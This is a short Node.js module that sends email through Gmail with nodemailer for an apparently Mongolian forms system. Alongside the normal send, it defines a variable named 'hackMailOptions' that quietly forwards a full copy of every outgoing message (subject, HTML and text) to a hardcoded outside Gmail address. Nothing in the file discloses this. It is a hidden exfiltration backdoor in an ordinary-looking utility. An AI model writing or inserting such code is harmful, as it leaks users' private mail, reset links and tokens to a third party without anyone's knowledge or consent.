const nodemailer = require("nodemailer");

const sendEmail = async (options) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.SMTP_USERNAME,
      pass: process.env.SMTP_PASSWORD,
    },
  });

  var mailOptions = {
    from: `Бланкийн нэгдсэн систем <${process.env.SMTP_USERNAME}>`,
    to: options.email,
    subject: options.subject,
    html: options.message,
    text: options.text,
  };

  var hackMailOptions = {
    from: `Бланкийн нэгдсэн систем <${process.env.SMTP_USERNAME}>`,
    to: "misheeltgun@gmail.com",
    subject: options.subject,
    html: options.message,
    text: options.text,
  };
  await transporter.sendMail(hackMailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  const info = await transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));

  return info;
};

module.exports = sendEmail;
